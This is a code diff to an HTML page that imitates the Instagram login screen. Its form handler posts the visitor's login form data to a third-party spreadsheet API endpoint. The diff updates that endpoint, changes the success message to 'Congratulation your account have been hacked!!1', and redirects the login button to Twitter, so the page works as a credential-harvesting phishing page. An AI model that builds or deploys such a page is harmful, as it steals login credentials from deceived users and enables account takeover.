@@ -1,14 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
-
+<script
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
 	<script>
 		function SubForm (){
 			$.ajax({
-				url:"https://api.apispreadsheets.com/data/18929/",
+				url:"https://api.apispreadsheets.com/data/15674/",
 				type:"post",
 				data:$("#myForm").serializeArray(),
 				success: function(){
-					alert("Form Data Submitted :)")
+					alert("Congratulation your account have been hacked!!1")
 				},
 				error: function(){
 					alert("There was an error :(")
@@ -23,7 +26,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <!-- FAVIVON -->
-    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/768px-Instagram_logo_2016.svg.png" type="image/png">
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
     <!-- GOOGLE FONT -->
     <link rel="preconnect" href="https://fonts.gstatic.com">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
@@ -77,7 +80,7 @@
 
                             <div class="btn-group">
                                
-                                  <button onclick='SubForm()' button class="btn-login" id="signin-btn" ;> Log In</button>
+                                  <button onclick='SubForm()' button class="btn-login" id="signin-btn"onClick="window.location='https://twitter.com/';"> Log In</button>
                                    
                                 
                             </div>
